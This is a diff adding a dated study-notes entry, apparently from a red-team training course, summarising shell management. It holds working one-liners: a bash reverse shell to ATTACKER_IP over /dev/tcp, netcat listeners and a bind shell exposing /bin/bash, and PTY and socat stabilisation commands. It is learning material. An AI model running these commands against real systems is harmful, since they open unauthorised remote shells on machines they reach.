@@ -3132,3 +3132,44 @@ Exploit-DB
 Rapid7 Vulnerability Database
 
 CVE-2021-41773 Details
+
+(Day 7: 2025/10/13)
+
+# What The Shell? - Red Team Shell Management
+
+## Overview
+Comprehensive guide to shell types, tools, and techniques for Red Team operations.
+
+## Core Concepts
+- **Shell Types**: Reverse vs Bind shells
+- **Tools**: Netcat, Socat, Msfvenom, Metasploit
+- **Stabilization**: TTY/PTY techniques
+- **Encryption**: SSL encrypted shells with Socat
+
+## Quick Reference
+
+### Reverse Shells
+```bash
+# Netcat
+nc -lvnp 4444
+
+# Target connects back
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+Bind Shells
+bash
+# Target listens
+nc -lvnp 4445 -e /bin/bash
+
+# Attacker connects
+nc TARGET_IP 4445
+Shell Stabilization
+bash
+# Python TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Socat encrypted
+socat FILE:`tty`,raw,echo=0 TCP-L:4444
+Practice Environments
+Linux practice box: File upload vulnerabilities
+
+Windows practice box: Payload execution
